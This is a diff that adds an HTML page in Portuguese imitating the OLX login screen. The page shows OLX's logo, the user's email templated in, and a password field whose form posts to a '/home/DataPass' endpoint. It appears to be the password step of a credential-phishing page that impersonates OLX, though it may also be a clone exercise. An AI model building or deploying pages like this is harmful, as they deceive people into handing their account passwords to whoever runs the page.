@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="/styles/stylepagSenha.css">
+    <title>account</title>
+</head>
+<body>
+    <header>
+        <div>
+            <img src="https://logopng.com.br/logos/olx-104.svg" alt="olx">
+        </div>
+    </header>
+    <div  class="divLinha">
+        <!--conteiner  linha -->
+    </div>
+    <main>
+        <form  class="form2" action="/home/DataPass"  method="post">
+            <div class="divH1">
+                <h3>Acesse a sua conta</h3>
+                <div class="divEmailSend">
+                    <p class="param_Account">{{email}}</p>
+                </div>
+            </div>
+          
+            <div class="divInput">
+                <div>
+                    <label>Senha</label><br>
+
+                    <div class="inputPAss">
+                        <input name="passwd" class="passwd" type="password">
+                        <ion-icon class="olhoPass" name="eye-off-outline"></ion-icon>
+                    </div>
+                    <!-- verificar a senha -->
+                    <div class="divspan">
+                        <span class="spanEmail">
+                            campo obrigatorio. informe um e-mail valido
+                        </span>
+                        <ion-icon class="iconErro" name="close-circle-outline"></ion-icon>
+                    </div>
+                </div>
+            </div>
+            <div>
+                <button class="btn" type="submit">Entrar</button>
+            </div>
+            <div class="RedefinirPass">
+               <a href="/frontend/index.html">Voltar</a>
+               <a href="#">Esqueceu sua senha ?</a>
+            </div>
+
+            <hr class="hrFooter">
+            <div class="divfooter">
+                <p>Ao continuar , voce concorda com os <a href="#">Termos de Uso</a> e a </p>
+                <p><a href="#">Politica de privacidade</a> da OLX e seus parceiros, e em receber<br>cominicacoes da OLX</p>
+            </div>
+            <br>
+        </form>
+    </main>
+    <script type="module" src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.esm.js"></script>
+    <script nomodule src="https://unpkg.com/ionicons@7.1.0/dist/ionicons/ionicons.js"></script>
+    <script src="/javascript/pag2.js"></script>
+</body>
+</html>
